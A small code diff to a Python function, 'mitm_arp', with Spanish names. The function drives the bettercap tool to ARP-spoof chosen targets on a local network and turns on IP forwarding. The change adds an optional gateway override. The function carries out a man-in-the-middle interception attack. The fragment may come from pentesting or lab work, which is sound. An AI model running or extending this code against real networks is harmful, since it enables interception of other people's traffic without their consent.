@@ -73,8 +73,10 @@ def mitm_arp(interfaz, objetivo, gateway, segundos, seco, solo_objetivos=False):
               f"{'true' if solo_objetivos else 'false'}; "
               f"set arp.spoof.targets {objetivo or ''}; arp.spoof on; "
               f"sleep {segundos}; quit")
-    orden = [bettercap, "-iface", interfaz, "-silent", "-caplet", "/dev/null",
-             "-eval", caplet]
+    orden = [bettercap, "-iface", interfaz, "-silent", "-caplet", "/dev/null"]
+    if gateway:
+        orden += ["-gateway-override", gateway]
+    orden += ["-eval", caplet]
     print(f"[i] ip_forward={fwd_original} (se restaura al terminar)")
     with open(ruta_fwd, "w", encoding="ascii") as f:
         f.write("1\n")
